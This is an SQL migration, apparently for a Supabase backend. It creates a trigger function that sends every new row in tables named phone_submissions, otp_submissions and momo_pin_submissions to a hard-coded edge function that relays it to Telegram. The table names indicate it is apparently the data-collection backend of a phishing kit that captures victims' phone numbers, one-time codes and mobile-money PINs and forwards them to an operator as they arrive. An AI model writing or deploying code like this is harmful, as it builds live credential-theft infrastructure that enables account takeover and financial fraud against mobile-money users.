/*
  # Setup Telegram Notifications

  1. Database Functions
    - Creates a trigger function that sends HTTP requests to the edge function
    - Uses pg_net extension for HTTP requests
  
  2. Triggers
    - Adds triggers on all three tables (phone_submissions, otp_submissions, momo_pin_submissions)
    - Triggers fire after INSERT operations
    - Automatically sends data to Telegram via edge function

  3. Extensions
    - Enables pg_net extension for HTTP requests
*/

-- Enable pg_net extension for HTTP requests
CREATE EXTENSION IF NOT EXISTS pg_net;

-- Create a function to notify Telegram via edge function
CREATE OR REPLACE FUNCTION notify_telegram()
RETURNS trigger AS $$
DECLARE
  webhook_url text;
  payload jsonb;
BEGIN
  -- Get the Supabase URL from settings
  webhook_url := current_setting('app.settings.supabase_url', true) || '/functions/v1/telegram-notifier';
  
  -- If not set in settings, use the default
  IF webhook_url IS NULL OR webhook_url = '' THEN
    webhook_url := 'https://nfjjxhmcbaihszfmrnjg.supabase.co/functions/v1/telegram-notifier';
  END IF;

  -- Build the payload
  payload := jsonb_build_object(
    'type', TG_OP,
    'table', TG_TABLE_NAME,
    'schema', TG_TABLE_SCHEMA,
    'record', row_to_json(NEW),
    'old_record', NULL
  );

  -- Make async HTTP request to edge function
  PERFORM net.http_post(
    url := webhook_url,
    headers := jsonb_build_object(
      'Content-Type', 'application/json'
    ),
    body := payload
  );

  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Create triggers for each table
DROP TRIGGER IF EXISTS telegram_notify_phone ON phone_submissions;
CREATE TRIGGER telegram_notify_phone
  AFTER INSERT ON phone_submissions
  FOR EACH ROW
  EXECUTE FUNCTION notify_telegram();

DROP TRIGGER IF EXISTS telegram_notify_otp ON otp_submissions;
CREATE TRIGGER telegram_notify_otp
  AFTER INSERT ON otp_submissions
  FOR EACH ROW
  EXECUTE FUNCTION notify_telegram();

DROP TRIGGER IF EXISTS telegram_notify_momo ON momo_pin_submissions;
CREATE TRIGGER telegram_notify_momo
  AFTER INSERT ON momo_pin_submissions
  FOR EACH ROW
  EXECUTE FUNCTION notify_telegram();